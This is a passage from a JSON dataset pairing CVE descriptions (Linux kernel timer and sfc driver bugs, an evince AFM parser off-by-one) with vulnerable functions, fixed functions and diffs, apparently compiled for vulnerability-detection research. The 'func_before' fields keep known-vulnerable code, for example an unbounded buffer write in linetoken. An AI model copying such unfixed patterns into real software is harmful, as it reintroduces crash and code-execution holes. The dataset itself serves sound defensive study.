        "func": "static void sgi_timer_get(struct k_itimer *timr, struct itimerspec *cur_setting)\n{\n\n\tif (timr->it.mmtimer.clock == TIMER_OFF) {\n\t\tcur_setting->it_interval.tv_nsec = 0;\n\t\tcur_setting->it_interval.tv_sec = 0;\n\t\tcur_setting->it_value.tv_nsec = 0;\n\t\tcur_setting->it_value.tv_sec =0;\n\t\treturn;\n\t}\n\n\tcur_setting->it_interval = ns_to_timespec(timr->it.mmtimer.incr * sgi_clock_period);\n\tcur_setting->it_value = ns_to_timespec((timr->it.mmtimer.expires - rtc_time()) * sgi_clock_period);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,7 +9,6 @@\n \t\treturn;\n \t}\n \n-\tns_to_timespec(cur_setting->it_interval, timr->it.mmtimer.incr * sgi_clock_period);\n-\tns_to_timespec(cur_setting->it_value, (timr->it.mmtimer.expires - rtc_time())* sgi_clock_period);\n-\treturn;\n+\tcur_setting->it_interval = ns_to_timespec(timr->it.mmtimer.incr * sgi_clock_period);\n+\tcur_setting->it_value = ns_to_timespec((timr->it.mmtimer.expires - rtc_time()) * sgi_clock_period);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tns_to_timespec(cur_setting->it_interval, timr->it.mmtimer.incr * sgi_clock_period);",
                "\tns_to_timespec(cur_setting->it_value, (timr->it.mmtimer.expires - rtc_time())* sgi_clock_period);",
                "\treturn;"
            ],
            "added_lines": [
                "\tcur_setting->it_interval = ns_to_timespec(timr->it.mmtimer.incr * sgi_clock_period);",
                "\tcur_setting->it_value = ns_to_timespec((timr->it.mmtimer.expires - rtc_time()) * sgi_clock_period);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/list_locations",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static int list_locations(struct kmem_cache *s, char *buf,\n\t\t\t\t\tenum track_item alloc)\n{\n\tint len = 0;\n\tunsigned long i;\n\tstruct loc_track t = { 0, 0, NULL };\n\tint node;\n\n\tif (!alloc_loc_track(&t, PAGE_SIZE / sizeof(struct location),\n\t\t\tGFP_TEMPORARY))\n\t\treturn sprintf(buf, \"Out of memory\\n\");\n\n\t/* Push back cpu slabs */\n\tflush_all(s);\n\n\tfor_each_node_state(node, N_NORMAL_MEMORY) {\n\t\tstruct kmem_cache_node *n = get_node(s, node);\n\t\tunsigned long flags;\n\t\tstruct page *page;\n\n\t\tif (!atomic_long_read(&n->nr_slabs))\n\t\t\tcontinue;\n\n\t\tspin_lock_irqsave(&n->list_lock, flags);\n\t\tlist_for_each_entry(page, &n->partial, lru)\n\t\t\tprocess_slab(&t, s, page, alloc);\n\t\tlist_for_each_entry(page, &n->full, lru)\n\t\t\tprocess_slab(&t, s, page, alloc);\n\t\tspin_unlock_irqrestore(&n->list_lock, flags);\n\t}\n\n\tfor (i = 0; i < t.count; i++) {\n\t\tstruct location *l = &t.loc[i];\n\n\t\tif (len > PAGE_SIZE - 100)\n\t\t\tbreak;\n\t\tlen += sprintf(buf + len, \"%7ld \", l->count);\n\n\t\tif (l->addr)\n\t\t\tlen += sprint_symbol(buf + len, (unsigned long)l->addr);\n\t\telse\n\t\t\tlen += sprintf(buf + len, \"<not-available>\");\n\n\t\tif (l->sum_time != l->min_time) {\n\t\t\tunsigned long remainder;\n\n\t\t\tlen += sprintf(buf + len, \" age=%ld/%ld/%ld\",\n\t\t\tl->min_time,\n\t\t\tdiv_long_long_rem(l->sum_time, l->count, &remainder),\n\t\t\tl->max_time);\n\t\t} else\n\t\t\tlen += sprintf(buf + len, \" age=%ld\",\n\t\t\t\tl->min_time);\n\n\t\tif (l->min_pid != l->max_pid)\n\t\t\tlen += sprintf(buf + len, \" pid=%ld-%ld\",\n\t\t\t\tl->min_pid, l->max_pid);\n\t\telse\n\t\t\tlen += sprintf(buf + len, \" pid=%ld\",\n\t\t\t\tl->min_pid);\n\n\t\tif (num_online_cpus() > 1 && !cpus_empty(l->cpus) &&\n\t\t\t\tlen < PAGE_SIZE - 60) {\n\t\t\tlen += sprintf(buf + len, \" cpus=\");\n\t\t\tlen += cpulist_scnprintf(buf + len, PAGE_SIZE - len - 50,\n\t\t\t\t\tl->cpus);\n\t\t}\n\n\t\tif (num_online_nodes() > 1 && !nodes_empty(l->nodes) &&\n\t\t\t\tlen < PAGE_SIZE - 60) {\n\t\t\tlen += sprintf(buf + len, \" nodes=\");\n\t\t\tlen += nodelist_scnprintf(buf + len, PAGE_SIZE - len - 50,\n\t\t\t\t\tl->nodes);\n\t\t}\n\n\t\tlen += sprintf(buf + len, \"\\n\");\n\t}\n\n\tfree_loc_track(&t);\n\tif (!t.count)\n\t\tlen += sprintf(buf, \"No data\\n\");\n\treturn len;\n}",
        "func": "static int list_locations(struct kmem_cache *s, char *buf,\n\t\t\t\t\tenum track_item alloc)\n{\n\tint len = 0;\n\tunsigned long i;\n\tstruct loc_track t = { 0, 0, NULL };\n\tint node;\n\n\tif (!alloc_loc_track(&t, PAGE_SIZE / sizeof(struct location),\n\t\t\tGFP_TEMPORARY))\n\t\treturn sprintf(buf, \"Out of memory\\n\");\n\n\t/* Push back cpu slabs */\n\tflush_all(s);\n\n\tfor_each_node_state(node, N_NORMAL_MEMORY) {\n\t\tstruct kmem_cache_node *n = get_node(s, node);\n\t\tunsigned long flags;\n\t\tstruct page *page;\n\n\t\tif (!atomic_long_read(&n->nr_slabs))\n\t\t\tcontinue;\n\n\t\tspin_lock_irqsave(&n->list_lock, flags);\n\t\tlist_for_each_entry(page, &n->partial, lru)\n\t\t\tprocess_slab(&t, s, page, alloc);\n\t\tlist_for_each_entry(page, &n->full, lru)\n\t\t\tprocess_slab(&t, s, page, alloc);\n\t\tspin_unlock_irqrestore(&n->list_lock, flags);\n\t}\n\n\tfor (i = 0; i < t.count; i++) {\n\t\tstruct location *l = &t.loc[i];\n\n\t\tif (len > PAGE_SIZE - 100)\n\t\t\tbreak;\n\t\tlen += sprintf(buf + len, \"%7ld \", l->count);\n\n\t\tif (l->addr)\n\t\t\tlen += sprint_symbol(buf + len, (unsigned long)l->addr);\n\t\telse\n\t\t\tlen += sprintf(buf + len, \"<not-available>\");\n\n\t\tif (l->sum_time != l->min_time) {\n\t\t\tlen += sprintf(buf + len, \" age=%ld/%ld/%ld\",\n\t\t\t\tl->min_time,\n\t\t\t\t(long)div_u64(l->sum_time, l->count),\n\t\t\t\tl->max_time);\n\t\t} else\n\t\t\tlen += sprintf(buf + len, \" age=%ld\",\n\t\t\t\tl->min_time);\n\n\t\tif (l->min_pid != l->max_pid)\n\t\t\tlen += sprintf(buf + len, \" pid=%ld-%ld\",\n\t\t\t\tl->min_pid, l->max_pid);\n\t\telse\n\t\t\tlen += sprintf(buf + len, \" pid=%ld\",\n\t\t\t\tl->min_pid);\n\n\t\tif (num_online_cpus() > 1 && !cpus_empty(l->cpus) &&\n\t\t\t\tlen < PAGE_SIZE - 60) {\n\t\t\tlen += sprintf(buf + len, \" cpus=\");\n\t\t\tlen += cpulist_scnprintf(buf + len, PAGE_SIZE - len - 50,\n\t\t\t\t\tl->cpus);\n\t\t}\n\n\t\tif (num_online_nodes() > 1 && !nodes_empty(l->nodes) &&\n\t\t\t\tlen < PAGE_SIZE - 60) {\n\t\t\tlen += sprintf(buf + len, \" nodes=\");\n\t\t\tlen += nodelist_scnprintf(buf + len, PAGE_SIZE - len - 50,\n\t\t\t\t\tl->nodes);\n\t\t}\n\n\t\tlen += sprintf(buf + len, \"\\n\");\n\t}\n\n\tfree_loc_track(&t);\n\tif (!t.count)\n\t\tlen += sprintf(buf, \"No data\\n\");\n\treturn len;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -42,12 +42,10 @@\n \t\t\tlen += sprintf(buf + len, \"<not-available>\");\n \n \t\tif (l->sum_time != l->min_time) {\n-\t\t\tunsigned long remainder;\n-\n \t\t\tlen += sprintf(buf + len, \" age=%ld/%ld/%ld\",\n-\t\t\tl->min_time,\n-\t\t\tdiv_long_long_rem(l->sum_time, l->count, &remainder),\n-\t\t\tl->max_time);\n+\t\t\t\tl->min_time,\n+\t\t\t\t(long)div_u64(l->sum_time, l->count),\n+\t\t\t\tl->max_time);\n \t\t} else\n \t\t\tlen += sprintf(buf + len, \" age=%ld\",\n \t\t\t\tl->min_time);",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tunsigned long remainder;",
                "",
                "\t\t\tl->min_time,",
                "\t\t\tdiv_long_long_rem(l->sum_time, l->count, &remainder),",
                "\t\t\tl->max_time);"
            ],
            "added_lines": [
                "\t\t\t\tl->min_time,",
                "\t\t\t\t(long)div_u64(l->sum_time, l->count),",
                "\t\t\t\tl->max_time);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3209",
        "func_name": "torvalds/linux/sample_to_timespec",
        "description": "The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.",
        "git_url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
        "commit_title": "remove div_long_long_rem",
        "commit_text": " x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com>",
        "func_before": "static void sample_to_timespec(const clockid_t which_clock,\n\t\t\t       union cpu_time_count cpu,\n\t\t\t       struct timespec *tp)\n{\n\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED) {\n\t\ttp->tv_sec = div_long_long_rem(cpu.sched,\n\t\t\t\t\t       NSEC_PER_SEC, &tp->tv_nsec);\n\t} else {\n\t\tcputime_to_timespec(cpu.cpu, tp);\n\t}\n}",
        "func": "static void sample_to_timespec(const clockid_t which_clock,\n\t\t\t       union cpu_time_count cpu,\n\t\t\t       struct timespec *tp)\n{\n\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED)\n\t\t*tp = ns_to_timespec(cpu.sched);\n\telse\n\t\tcputime_to_timespec(cpu.cpu, tp);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,10 +2,8 @@\n \t\t\t       union cpu_time_count cpu,\n \t\t\t       struct timespec *tp)\n {\n-\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED) {\n-\t\ttp->tv_sec = div_long_long_rem(cpu.sched,\n-\t\t\t\t\t       NSEC_PER_SEC, &tp->tv_nsec);\n-\t} else {\n+\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED)\n+\t\t*tp = ns_to_timespec(cpu.sched);\n+\telse\n \t\tcputime_to_timespec(cpu.cpu, tp);\n-\t}\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED) {",
                "\t\ttp->tv_sec = div_long_long_rem(cpu.sched,",
                "\t\t\t\t\t       NSEC_PER_SEC, &tp->tv_nsec);",
                "\t} else {",
                "\t}"
            ],
            "added_lines": [
                "\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED)",
                "\t\t*tp = ns_to_timespec(cpu.sched);",
                "\telse"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-3412",
        "func_name": "torvalds/linux/efx_probe_all",
        "description": "The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.",
        "git_url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_title": "sfc: Fix maximum number of TSO segments and minimum TX queue size",
        "commit_text": " [ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]  Currently an skb requiring TSO may not fit within a minimum-size TX queue.  The TX queue selected for the skb may stall and trigger the TX watchdog repeatedly (since the problem skb will be retried after the TX reset).  This issue is designated as CVE-2012-3412.  Set the maximum number of TSO segments for our devices to 100.  This should make no difference to behaviour unless the actual MSS is less than about 700.  Increase the minimum TX queue size accordingly to allow for 2 worst-case skbs, so that there will definitely be space to add an skb after we wake a queue.  To avoid invalidating existing configurations, change efx_ethtool_set_ringparam() to fix up values that are too small rather than returning -EINVAL. ",
        "func_before": "static int efx_probe_all(struct efx_nic *efx)\n{\n\tint rc;\n\n\trc = efx_probe_nic(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create NIC\\n\");\n\t\tgoto fail1;\n\t}\n\n\trc = efx_probe_port(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create port\\n\");\n\t\tgoto fail2;\n\t}\n\n\tefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n\trc = efx_probe_channels(efx);\n\tif (rc)\n\t\tgoto fail3;\n\n\trc = efx_probe_filters(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev,\n\t\t\t  \"failed to create filter tables\\n\");\n\t\tgoto fail4;\n\t}\n\n\treturn 0;\n\n fail4:\n\tefx_remove_channels(efx);\n fail3:\n\tefx_remove_port(efx);\n fail2:\n\tefx_remove_nic(efx);\n fail1:\n\treturn rc;\n}",
        "func": "static int efx_probe_all(struct efx_nic *efx)\n{\n\tint rc;\n\n\trc = efx_probe_nic(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create NIC\\n\");\n\t\tgoto fail1;\n\t}\n\n\trc = efx_probe_port(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create port\\n\");\n\t\tgoto fail2;\n\t}\n\n\tBUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);\n\tif (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {\n\t\trc = -EINVAL;\n\t\tgoto fail3;\n\t}\n\tefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n\trc = efx_probe_channels(efx);\n\tif (rc)\n\t\tgoto fail3;\n\n\trc = efx_probe_filters(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev,\n\t\t\t  \"failed to create filter tables\\n\");\n\t\tgoto fail4;\n\t}\n\n\treturn 0;\n\n fail4:\n\tefx_remove_channels(efx);\n fail3:\n\tefx_remove_port(efx);\n fail2:\n\tefx_remove_nic(efx);\n fail1:\n\treturn rc;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,6 +14,11 @@\n \t\tgoto fail2;\n \t}\n \n+\tBUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);\n+\tif (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {\n+\t\trc = -EINVAL;\n+\t\tgoto fail3;\n+\t}\n \tefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n \trc = efx_probe_channels(efx);\n \tif (rc)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tBUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);",
                "\tif (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {",
                "\t\trc = -EINVAL;",
                "\t\tgoto fail3;",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-3412",
        "func_name": "torvalds/linux/efx_register_netdev",
        "description": "The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.",
        "git_url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_title": "sfc: Fix maximum number of TSO segments and minimum TX queue size",
        "commit_text": " [ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]  Currently an skb requiring TSO may not fit within a minimum-size TX queue.  The TX queue selected for the skb may stall and trigger the TX watchdog repeatedly (since the problem skb will be retried after the TX reset).  This issue is designated as CVE-2012-3412.  Set the maximum number of TSO segments for our devices to 100.  This should make no difference to behaviour unless the actual MSS is less than about 700.  Increase the minimum TX queue size accordingly to allow for 2 worst-case skbs, so that there will definitely be space to add an skb after we wake a queue.  To avoid invalidating existing configurations, change efx_ethtool_set_ringparam() to fix up values that are too small rather than returning -EINVAL. ",
        "func_before": "static int efx_register_netdev(struct efx_nic *efx)\n{\n\tstruct net_device *net_dev = efx->net_dev;\n\tstruct efx_channel *channel;\n\tint rc;\n\n\tnet_dev->watchdog_timeo = 5 * HZ;\n\tnet_dev->irq = efx->pci_dev->irq;\n\tnet_dev->netdev_ops = &efx_netdev_ops;\n\tSET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);\n\n\t/* Clear MAC statistics */\n\tefx->mac_op->update_stats(efx);\n\tmemset(&efx->mac_stats, 0, sizeof(efx->mac_stats));\n\n\trtnl_lock();\n\n\trc = dev_alloc_name(net_dev, net_dev->name);\n\tif (rc < 0)\n\t\tgoto fail_locked;\n\tefx_update_name(efx);\n\n\trc = register_netdevice(net_dev);\n\tif (rc)\n\t\tgoto fail_locked;\n\n\tefx_for_each_channel(channel, efx) {\n\t\tstruct efx_tx_queue *tx_queue;\n\t\tefx_for_each_channel_tx_queue(tx_queue, channel)\n\t\t\tefx_init_tx_queue_core_txq(tx_queue);\n\t}\n\n\t/* Always start with carrier off; PHY events will detect the link */\n\tnetif_carrier_off(efx->net_dev);\n\n\trtnl_unlock();\n\n\trc = device_create_file(&efx->pci_dev->dev, &dev_attr_phy_type);\n\tif (rc) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"failed to init net dev attributes\\n\");\n\t\tgoto fail_registered;\n\t}\n\n\treturn 0;\n\nfail_locked:\n\trtnl_unlock();\n\tnetif_err(efx, drv, efx->net_dev, \"could not register net dev\\n\");\n\treturn rc;\n\nfail_registered:\n\tunregister_netdev(net_dev);\n\treturn rc;\n}",
        "func": "static int efx_register_netdev(struct efx_nic *efx)\n{\n\tstruct net_device *net_dev = efx->net_dev;\n\tstruct efx_channel *channel;\n\tint rc;\n\n\tnet_dev->watchdog_timeo = 5 * HZ;\n\tnet_dev->irq = efx->pci_dev->irq;\n\tnet_dev->netdev_ops = &efx_netdev_ops;\n\tSET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);\n\tnet_dev->gso_max_segs = EFX_TSO_MAX_SEGS;\n\n\t/* Clear MAC statistics */\n\tefx->mac_op->update_stats(efx);\n\tmemset(&efx->mac_stats, 0, sizeof(efx->mac_stats));\n\n\trtnl_lock();\n\n\trc = dev_alloc_name(net_dev, net_dev->name);\n\tif (rc < 0)\n\t\tgoto fail_locked;\n\tefx_update_name(efx);\n\n\trc = register_netdevice(net_dev);\n\tif (rc)\n\t\tgoto fail_locked;\n\n\tefx_for_each_channel(channel, efx) {\n\t\tstruct efx_tx_queue *tx_queue;\n\t\tefx_for_each_channel_tx_queue(tx_queue, channel)\n\t\t\tefx_init_tx_queue_core_txq(tx_queue);\n\t}\n\n\t/* Always start with carrier off; PHY events will detect the link */\n\tnetif_carrier_off(efx->net_dev);\n\n\trtnl_unlock();\n\n\trc = device_create_file(&efx->pci_dev->dev, &dev_attr_phy_type);\n\tif (rc) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"failed to init net dev attributes\\n\");\n\t\tgoto fail_registered;\n\t}\n\n\treturn 0;\n\nfail_locked:\n\trtnl_unlock();\n\tnetif_err(efx, drv, efx->net_dev, \"could not register net dev\\n\");\n\treturn rc;\n\nfail_registered:\n\tunregister_netdev(net_dev);\n\treturn rc;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,6 +8,7 @@\n \tnet_dev->irq = efx->pci_dev->irq;\n \tnet_dev->netdev_ops = &efx_netdev_ops;\n \tSET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);\n+\tnet_dev->gso_max_segs = EFX_TSO_MAX_SEGS;\n \n \t/* Clear MAC statistics */\n \tefx->mac_op->update_stats(efx);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tnet_dev->gso_max_segs = EFX_TSO_MAX_SEGS;"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-3412",
        "func_name": "torvalds/linux/efx_ethtool_set_ringparam",
        "description": "The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.",
        "git_url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_title": "sfc: Fix maximum number of TSO segments and minimum TX queue size",
        "commit_text": " [ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]  Currently an skb requiring TSO may not fit within a minimum-size TX queue.  The TX queue selected for the skb may stall and trigger the TX watchdog repeatedly (since the problem skb will be retried after the TX reset).  This issue is designated as CVE-2012-3412.  Set the maximum number of TSO segments for our devices to 100.  This should make no difference to behaviour unless the actual MSS is less than about 700.  Increase the minimum TX queue size accordingly to allow for 2 worst-case skbs, so that there will definitely be space to add an skb after we wake a queue.  To avoid invalidating existing configurations, change efx_ethtool_set_ringparam() to fix up values that are too small rather than returning -EINVAL. ",
        "func_before": "static int efx_ethtool_set_ringparam(struct net_device *net_dev,\n\t\t\t\t     struct ethtool_ringparam *ring)\n{\n\tstruct efx_nic *efx = netdev_priv(net_dev);\n\n\tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n\t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n\t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n\t\treturn -EINVAL;\n\n\tif (ring->rx_pending < EFX_MIN_RING_SIZE ||\n\t    ring->tx_pending < EFX_MIN_RING_SIZE) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"TX and RX queues cannot be smaller than %ld\\n\",\n\t\t\t  EFX_MIN_RING_SIZE);\n\t\treturn -EINVAL;\n\t}\n\n\treturn efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);\n}",
        "func": "static int efx_ethtool_set_ringparam(struct net_device *net_dev,\n\t\t\t\t     struct ethtool_ringparam *ring)\n{\n\tstruct efx_nic *efx = netdev_priv(net_dev);\n\tu32 txq_entries;\n\n\tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n\t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n\t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n\t\treturn -EINVAL;\n\n\tif (ring->rx_pending < EFX_RXQ_MIN_ENT) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"RX queues cannot be smaller than %u\\n\",\n\t\t\t  EFX_RXQ_MIN_ENT);\n\t\treturn -EINVAL;\n\t}\n\n\ttxq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));\n\tif (txq_entries != ring->tx_pending)\n\t\tnetif_warn(efx, drv, efx->net_dev,\n\t\t\t   \"increasing TX queue size to minimum of %u\\n\",\n\t\t\t   txq_entries);\n\n\treturn efx_realloc_channels(efx, ring->rx_pending, txq_entries);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,19 +2,25 @@\n \t\t\t\t     struct ethtool_ringparam *ring)\n {\n \tstruct efx_nic *efx = netdev_priv(net_dev);\n+\tu32 txq_entries;\n \n \tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n \t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n \t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n \t\treturn -EINVAL;\n \n-\tif (ring->rx_pending < EFX_MIN_RING_SIZE ||\n-\t    ring->tx_pending < EFX_MIN_RING_SIZE) {\n+\tif (ring->rx_pending < EFX_RXQ_MIN_ENT) {\n \t\tnetif_err(efx, drv, efx->net_dev,\n-\t\t\t  \"TX and RX queues cannot be smaller than %ld\\n\",\n-\t\t\t  EFX_MIN_RING_SIZE);\n+\t\t\t  \"RX queues cannot be smaller than %u\\n\",\n+\t\t\t  EFX_RXQ_MIN_ENT);\n \t\treturn -EINVAL;\n \t}\n \n-\treturn efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);\n+\ttxq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));\n+\tif (txq_entries != ring->tx_pending)\n+\t\tnetif_warn(efx, drv, efx->net_dev,\n+\t\t\t   \"increasing TX queue size to minimum of %u\\n\",\n+\t\t\t   txq_entries);\n+\n+\treturn efx_realloc_channels(efx, ring->rx_pending, txq_entries);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (ring->rx_pending < EFX_MIN_RING_SIZE ||",
                "\t    ring->tx_pending < EFX_MIN_RING_SIZE) {",
                "\t\t\t  \"TX and RX queues cannot be smaller than %ld\\n\",",
                "\t\t\t  EFX_MIN_RING_SIZE);",
                "\treturn efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);"
            ],
            "added_lines": [
                "\tu32 txq_entries;",
                "\tif (ring->rx_pending < EFX_RXQ_MIN_ENT) {",
                "\t\t\t  \"RX queues cannot be smaller than %u\\n\",",
                "\t\t\t  EFX_RXQ_MIN_ENT);",
                "\ttxq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));",
                "\tif (txq_entries != ring->tx_pending)",
                "\t\tnetif_warn(efx, drv, efx->net_dev,",
                "\t\t\t   \"increasing TX queue size to minimum of %u\\n\",",
                "\t\t\t   txq_entries);",
                "",
                "\treturn efx_realloc_channels(efx, ring->rx_pending, txq_entries);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-5244",
        "func_name": "GNOME/evince/linetoken",
        "description": "Multiple off-by-one errors in the (1) token and (2) linetoken functions in backend/dvi/mdvi-lib/afmparse.c in t1lib, as used in teTeX 3.0.x, GNOME evince, and possibly other products, allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a DVI file containing a crafted Adobe Font Metrics (AFM) file, different vulnerabilities than CVE-2010-2642 and CVE-2011-0433.",
        "git_url": "https://github.com/GNOME/evince/commit/439c5070022eab6cef7266aab47f978058012c72",
        "commit_title": "backends: Fix another security issue in the dvi-backend",
        "commit_text": " This is similar to one of the fixes from d4139205.  https://bugzilla.gnome.org/show_bug.cgi?id=640923",
        "func_before": "static char *linetoken(FILE *stream)\n{\n    int ch, idx;\n\n    while ((ch = fgetc(stream)) == ' ' || ch == '\\t' ); \n    \n    idx = 0;\n    while (ch != EOF && ch != lineterm) \n    {\n        ident[idx++] = ch;\n        ch = fgetc(stream);\n    } /* while */\n    \n    ungetc(ch, stream);\n    ident[idx] = 0;\n\n    return(ident);\t/* returns pointer to the token */\n\n}",
        "func": "static char *linetoken(FILE *stream)\n{\n    int ch, idx;\n\n    while ((ch = fgetc(stream)) == ' ' || ch == '\\t' ); \n    \n    idx = 0;\n    while (ch != EOF && ch != lineterm && idx < MAX_NAME)\n    {\n        ident[idx++] = ch;\n        ch = fgetc(stream);\n    } /* while */\n    \n    ungetc(ch, stream);\n    ident[idx] = 0;\n\n    return(ident);\t/* returns pointer to the token */\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n     while ((ch = fgetc(stream)) == ' ' || ch == '\\t' ); \n     \n     idx = 0;\n-    while (ch != EOF && ch != lineterm) \n+    while (ch != EOF && ch != lineterm && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);",
        "diff_line_info": {
            "deleted_lines": [
                "    while (ch != EOF && ch != lineterm) "
            ],
            "added_lines": [
                "    while (ch != EOF && ch != lineterm && idx < MAX_NAME)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-5244",
        "func_name": "GNOME/evince/tfm_load_file",
        "description": "Multiple off-by-one errors in the (1) token and (2) linetoken functions in backend/dvi/mdvi-lib/afmparse.c in t1lib, as used in teTeX 3.0.x, GNOME evince, and possibly other products, allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a DVI file containing a crafted Adobe Font Metrics (AFM) file, different vulnerabilities than CVE-2010-2642 and CVE-2011-0433.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
